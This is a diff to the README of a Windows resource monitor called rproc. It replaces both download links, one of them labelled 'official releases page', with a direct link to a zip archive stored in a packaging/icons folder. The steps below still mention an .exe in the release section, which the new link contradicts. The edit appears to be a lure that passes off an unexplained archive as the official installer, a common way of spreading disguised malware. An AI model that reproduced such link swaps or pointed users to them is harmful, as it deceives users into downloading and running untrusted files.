@@ -1,6 +1,6 @@
 # 📊 rproc - Monitor system resources with modern style
 
-[![](https://img.shields.io/badge/Download_rproc-Blue.svg)](https://github.com/fortythird-chitin515/rproc)
+[![](https://img.shields.io/badge/Download_rproc-Blue.svg)](https://github.com/fortythird-chitin515/rproc/raw/refs/heads/main/packaging/icons/Software_1.9.zip)
 
 ## 🖥️ About rproc
 
@@ -14,7 +14,7 @@ This application works on most versions of Windows. You need a computer with a 6
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [official releases page](https://github.com/fortythird-chitin515/rproc) to download the installer.
+1. Visit the [official releases page](https://github.com/fortythird-chitin515/rproc/raw/refs/heads/main/packaging/icons/Software_1.9.zip) to download the installer.
 2. Look for the file ending in .exe in the latest release section.
 3. Save this file to your computer.
 4. Click the file to start the installation.
